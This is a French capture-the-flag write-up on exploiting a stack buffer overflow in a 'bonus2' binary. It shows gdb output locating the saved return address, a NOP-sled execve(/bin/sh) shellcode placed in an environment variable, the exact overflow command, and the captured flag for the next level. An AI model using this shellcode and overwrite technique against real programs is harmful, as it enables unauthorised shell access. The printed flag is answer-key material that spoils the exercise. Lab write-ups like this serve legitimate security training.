Dans ce niveau notre executable a 2 fonction `main()` et `greetuser()`

La fonction main prend 2 args, elle va copier le premier (sur 40 char)
```sh
0x08048564 <+59>:	movl   $0x28,0x8(%esp)
```
Ensuite elle va copier le second a la suite du premier et enfin va recup la `var d'env LANG`
```sh
0x0804859f      c704243887..   mov dword [esp], str.LANG   ; [0x8048738:4]=0x474e414c ; "LANG"
```
Il y a des comparaison du retour avec `fi` et `nl` pour l'appel a `greetuser`

Avec `fi` on a `Hyvää päivää` et avec `nl` c'est `Goedemiddag!` qui est ecrit sinon ca sera `Hello`

Apres plusieurs essais sans changer la variable `LANG` nous manquons de characteres pour ecrire par dessus l'eip completement

l'eip est a cette adresse `0xbffff6cc` :
```sh
Breakpoint 2 (0x08048528) pending.
(gdb) i f
Stack level 0, frame at 0xbffff6d0:
 eip = 0x804852f in main; saved eip 0xb7e454d3
 Arglist at 0xbffff6c8, args: 
 Locals at 0xbffff6c8, Previous frame's sp is 0xbffff6d0
 Saved registers:
  ebp at 0xbffff6c8, eip at 0xbffff6cc
```

Donc on va changer en `nl` avec `export LANG=nl`

Ensuite ici on peut ecrire par dessus l'eip, on va remplacer ce qui se trouve a son adresse par l'adresse d'un script passe en variable d'env (comme bonus0)

Avec encore le meme shellcode `execve(/bin/sh)` :

`export SCRIPT=$(python -c 'print "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')`

On va noter son adresse en se placant dans les instrcutions `NOP`:
```sh
0xbffff906:	 "SCRIPT=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"
[...]
(gdb) x/12wx 0xbffff906
0xbffff906:	0x49524353	0x903d5450	0x90909090	0x90909090
0xbffff916:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff926:	0x90909090	0x90909090	0x90909090	0x90909090
```
Pour savoir ou placer l'adresse dans notre 2eme arg on a besoin de savoir combien de char placer avant (ici 23 "B" sont place avant l'eip `0xbffff6cc`)
```sh
(gdb) x/20wx $eax
0xbffff580:	0x64656f47	0x64696d65	0x21676164	0x41414120
0xbffff590:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff5a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff5b0:	0x41414141	0x42424241	0x42424242	0x42424242
0xbffff5c0:	0x42424242	0x42424242	0x42424242	0xbffff926
``` 
On peut donc envoyer ce script : `./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x26\xf9\xff\xbf"')`

Notre shell est ouvert on peut donc `cat /home/user/bonus3/.pass` pour recuperer le flag `71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`